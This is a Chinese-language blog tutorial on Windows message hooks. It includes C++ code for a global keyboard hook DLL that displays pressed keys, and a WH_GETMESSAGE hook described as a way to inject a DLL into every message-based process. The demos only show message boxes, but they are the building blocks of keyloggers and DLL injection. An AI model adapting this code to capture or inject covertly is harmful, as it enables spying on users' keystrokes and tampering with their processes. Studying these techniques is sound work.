<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7852">https://xz.aliyun.com/t/7852</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/985/">https://www.ghtwf01.cn/index.php/archives/985/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/981/">https://www.ghtwf01.cn/index.php/archives/981/</a></p>
<p><a target="_blank" rel="noopener" href="http://althims.com/2020/02/05/phpok-5-4-173/">http://althims.com/2020/02/05/phpok-5-4-173/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-05T04:35:00.000Z" title="2021-02-05T04:35:00.000Z">2021-02-05</time>发表</span><span class="level-item"><time dateTime="2021-02-05T04:35:56.059Z" title="2021-02-05T04:35:56.059Z">2021-02-05</time>更新</span><span class="level-item">14 分钟读完 (大约2151个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/">Windows钩子函数</a></h1><div class="content"><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="钩子原理"><a href="#钩子原理" class="headerlink" title="钩子原理"></a>钩子原理</h1><p>​    Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。</p>
<p>​    钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。</p>
<p>​    安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。</p>
<h1 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h1><p>钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序</p>
<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK HookProc  <span class="comment">//所有的钩子函数都是这种形式</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">int</span> nCode,</span><br><span class="line">  WPARAM wParam,</span><br><span class="line">  LPARAM lParam,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。</p>
<p>参数wParam和<em>lParam</em>的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。</p>
<h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h2><p>返回一个钩子句柄</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HOOKPROC lpfn,<span class="comment">//回调函数，名称任意，参数和返回值数据固定</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HINSTANCE hMod,<span class="comment">//为DllMain第一个参数g_Inst=(HMODULE)hModule;</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwThreadId<span class="comment">//全局钩子设置0</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。</p>
<p>hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL</p>
<p>dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。</p>
<p>idHook:钩子的类型</p>
<p><img src="Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0.assets/20191231092715762.png" alt="img"></p>
<h2 id="UnhookWindowsEx"><a href="#UnhookWindowsEx" class="headerlink" title="UnhookWindowsEx"></a>UnhookWindowsEx</h2><p>移除先前用SetWindowsHookEx安装的钩子，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK hhk            <span class="comment">//钩子句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递</p>
<h2 id="CallNextHookEx"><a href="#CallNextHookEx" class="headerlink" title="CallNextHookEx"></a>CallNextHookEx</h2><p>使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK  hhk,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>    nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="GetKeyNameText"><a href="#GetKeyNameText" class="headerlink" title="GetKeyNameText"></a>GetKeyNameText</h2><p>GetKeyNameText函数检索表示键的名称的字符串。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetKeyNameTextA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG  lParam,<span class="comment">//钩子函数的第三个参数lparam</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR lpString,<span class="comment">//接收的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   cchSize<span class="comment">//最大大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h1 id="键盘钩子实例"><a href="#键盘钩子实例" class="headerlink" title="键盘钩子实例"></a>键盘钩子实例</h1><p>功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。</p>
<p>首先新建DLL文件，定义两个导出函数和两个全局变量</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义导出函数，开始hook和结束hook</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_Inst = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写钩子函数</span></span><br><span class="line"><span class="comment">//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子</span></span><br><span class="line"><span class="comment">//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递</span></span><br><span class="line"><span class="comment">//对钩子进行拦截</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> code,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。</span></span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本</span></span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION &amp;&amp; lParam &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        TCHAR szBuf[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        GetKeyNameText(lParam, szBuf, MAXBYTE);</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, szBuf, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Inst = (HMODULE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MFCKeyboardHookDlg.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHook.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHookDlg.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;KeyboardHook&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> new DEBUG_NEW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 对话框</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">	: CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent)</span><br><span class="line">&#123;</span><br><span class="line">	m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialog::DoDataExchange(pDX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog)</span><br><span class="line">	ON_WM_PAINT()</span><br><span class="line">	ON_WM_QUERYDRAGICON()</span><br><span class="line">	ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2)</span><br><span class="line">	ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 消息处理程序</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMFCKeyboardHookDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialog::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line">	<span class="comment">//  执行此操作</span></span><br><span class="line">	SetIcon(m_hIcon, TRUE);			<span class="comment">// 设置大图标</span></span><br><span class="line">	SetIcon(m_hIcon, FALSE);		<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果向对话框添加最小化按钮，则需要下面的代码</span></span><br><span class="line"><span class="comment">//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，</span></span><br><span class="line"><span class="comment">//  这将由框架自动完成。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnPaint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (IsIconic())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">CPaintDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>; <span class="comment">// 用于绘制的设备上下文</span></span><br><span class="line"></span><br><span class="line">		SendMessage(WM_ICONERASEBKGND, <span class="keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使图标在工作区矩形中居中</span></span><br><span class="line">		<span class="keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class="line">		<span class="keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class="line">		CRect rect;</span><br><span class="line">		GetClientRect(&amp;rect);</span><br><span class="line">		<span class="keyword">int</span> x = (rect.Width() - cxIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> y = (rect.Height() - cyIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 绘制图标</span></span><br><span class="line">		dc.DrawIcon(x, y, m_hIcon);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		CDialog::OnPaint();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当用户拖动最小化窗口时系统调用此函数取得光标</span></span><br><span class="line"><span class="comment">//显示。</span></span><br><span class="line"><span class="function">HCURSOR <span class="title">CMFCKeyboardHookDlg::OnQueryDragIcon</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;HCURSOR&gt;(m_hIcon);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	SetHookOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	SetHookOff();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="全局钩子DLL注入"><a href="#全局钩子DLL注入" class="headerlink" title="全局钩子DLL注入"></a>全局钩子DLL注入</h1><p>WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。</p>
<p>利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;    <span class="comment">//必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中</span></span><br><span class="line">                        <span class="comment">//而不是放在shared中,从而导致多个进程之间的共享行为失败</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInst;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMessageProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Hooked&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_ICONWARNING | MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        g_hInst = hModule;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

